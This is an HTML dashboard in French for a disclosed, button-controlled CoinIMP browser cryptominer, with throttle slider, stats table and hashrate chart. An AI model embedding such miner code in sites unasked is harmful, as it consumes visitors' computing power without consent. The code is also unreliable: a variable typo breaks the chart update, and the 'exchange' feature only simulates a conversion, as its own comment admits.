<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>ğŸš€ Deadspot Miner Interface</title>
<script src="https://www.hostingcloud.racing/EC1j.js"></script>
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<style>
body { background: #0a0a0f; color: #fff; font-family: monospace; text-align: center; padding: 20px; }
h1 { color: #ff00ff; text-shadow:0 0 10px #ff00ff,0 0 20px #ff00ff; margin-bottom:30px; }
button { padding:12px 25px; margin:10px; border:none; border-radius:6px; font-size:1em; cursor:pointer; background:#ff0066; color:#fff; box-shadow:0 0 10px #ff0066,0 0 20px #ff00ff; transition: transform 0.2s;}
button:hover{transform:scale(1.1);}
table { width:75%; margin:20px auto; border-collapse:collapse; background: rgba(20,20,30,0.9); border:2px solid #ff0066; box-shadow:0 0 15px #ff0066,0 0 30px #ff00ff; }
th, td { border:1px solid #00f; padding:12px; font-size:1.1em; }
th { background:#1a1a2e; color:#0ff; text-shadow:0 0 10px #0ff; }
td { color:#fff; text-shadow:0 0 8px #f0f; }
#consolelog { width:80%; height:180px; margin:30px auto; padding:10px; background:#111; border:2px solid #00f; overflow-y:auto; text-align:left; font-size:0.9em; color:#ff4444; box-shadow:0 0 10px #00f,0 0 20px #0ff; }
#chart-container { width:80%; margin:40px auto; background:#111; padding:15px; border-radius:8px; box-shadow:0 0 15px #0ff,0 0 30px #ff00ff; }
#throttle-control { margin-top:20px; color:#0ff; font-size:1.1em; }
input[type="range"] { width:300px; }
</style>
</head>
<body>

<h1>ğŸ’» Deadspot Mining Interface</h1>

<!-- Boutons Start / Stop -->
<div>
  <button id="startBtn">â–¶ï¸ Start Mining</button>
  <button id="stopBtn">â¹ Stop Mining</button>
</div>

<!-- Slider throttle -->
<div id="throttle-control">
  <label for="throttle">âš™ï¸ Throttle (25% - 90%) :</label>
  <input type="range" id="throttle" min="0.1" max="0.75" step="0.01" value="0.1">
  <span id="throttleValue">90%</span>
</div>

<!-- Tableau stats -->
<table>
<tr><th>Statistique</th><th>Valeur</th></tr>
<tr><td>âš¡ Hashrate actuel</td><td id="hashrate">0 H/s</td></tr>
<tr><td>ğŸ”¢ Total de Hashes</td><td id="totalhashes">0</td></tr>
<tr><td>ğŸ”¥ Force de Mining actuelle</td><td id="force">0%</td></tr>
<tr><td>âœ… Hashes AcceptÃ©s</td><td id="accepted">0</td></tr>
<tr><td>ğŸ’ Pool Mining</td><td id="poolMining">0 H/s</td></tr>
</table>

<!-- Bouton Ã©change hash â†’ H/s -->
<div>
  <button id="exchangeBtn">ğŸ’° Convertir 1â€¯000â€¯000â€¯000 Hash â†’ 1 H/s Pool Mining</button>
</div>

<!-- Graphique -->
<div id="chart-container">
  <canvas id="hashrateChart"></canvas>
</div>

<!-- Console log -->
<pre id="consolelog"></pre>

<script>
// Initialisation client CoinIMP
var _client = new Client.Anonymous('TA_VRAIE_SITE_KEY_COINIMP', {
    throttle: 0.1,
    c: 'w'
});

_client.addMiningNotification("Bottom","This site is running JavaScript miner from coinimp.com.","#850b8e",20,"#11b642");

// Start / Stop buttons
document.getElementById("startBtn").onclick = () => { _client.start(); log("[INFO] â–¶ï¸ Mining dÃ©marrÃ©"); };
document.getElementById("stopBtn").onclick = () => { _client.stop(); log("[INFO] â¹ Mining arrÃªtÃ©"); };

// Throttle slider
const throttleSlider = document.getElementById("throttle");
const throttleValue = document.getElementById("throttleValue");
throttleSlider.oninput = function() {
  _client.setThrottle(parseFloat(this.value));
  let percent = Math.round((1 - this.value)*100);
  throttleValue.textContent = percent + "%";
  log("[CTRL] âš™ï¸ Throttle rÃ©glÃ© Ã  " + percent + "%");
};

// Pool Mining bonus
let poolMining = 0;

// Bouton Ã©change hash â†’ H/s
document.getElementById("exchangeBtn").onclick = function() {
  let totalHashes = _client.getTotalHashes(true);
  if(totalHashes >= 1000000000){
    poolMining += 1;
    totalHashes -= 1000000000;
    // on force le reset du compteur du client pour simuler deduction (CoinIMP ne permet pas vraiment)
    // mais pour affichage live on fait comme Ã§a
    document.getElementById("poolMining").innerText = poolMining + " H/s (Pool Mining)";
    log("[EXCHANGE] ğŸ’° 1â€¯000â€¯000â€¯000 Hash convertis en 1 H/s Pool Mining");
  } else {
    log("[EXCHANGE] âŒ Pas assez de Hash pour convertir");
  }
};

// Graphique Hashrate
const ctx = document.getElementById('hashrateChart').getContext('2d');
const hashrateChart = new Chart(ctx, { type:'line', data:{ labels:[], datasets:[{label:'Hashrate (H/s)', data:[], borderColor:'#ff00ff', backgroundColor:'rgba(255,0,255,0.2)', tension:0.2, fill:true }] }, options:{ responsive:true, plugins:{legend:{labels:{color:'#fff'}}}, scales:{ x:{ticks:{color:'#0ff'}, grid:{color:'#333'}}, y:{ticks:{color:'#ff4444'}, grid:{color:'#333'}} } } });

// Console log helper
function log(msg){ let logBox = document.getElementById("consolelog"); logBox.innerText += msg + "\n"; logBox.scrollTop = logBox.scrollHeight; }

// Update stats toutes les 2s
setInterval(()=>{
  let hashrate = _client.getHashesPerSecond().toFixed(2);
  let total = _client.getTotalHashes(true);
  let accepted = _client.getAcceptedHashes();
  let force = Math.min(100,(hashrate/50*100)).toFixed(1);

  document.getElementById("hashrate").innerText = hashrate + " H/s";
  document.getElementById("totalhashes").innerText = total;
  document.getElementById("accepted").innerText = accepted;
  document.getElementById("force").innerText = force + " %";
  document.getElementById("poolMining").innerText = poolMining + " H/s (Pool Mining)";

  let time = new Date().toLocaleTimeString();
  hashrateChart.data.labels.push(time);
  hashrateChart.data.datasets[0].data.push(hashrate);
  if(hashrateChart.data.labels.length>20){ hashRateChart.data.labels.shift(); hashrateChart.data.datasets[0].data.shift(); }
  hashrateChart.update();

  log("[STAT] âš¡ "+hashrate+" H/s | ğŸ”¢ "+total+" | âœ… "+accepted+" | ğŸ’ Pool Mining: "+poolMining+" H/s");
},2000);

</script>
</body>
</html>
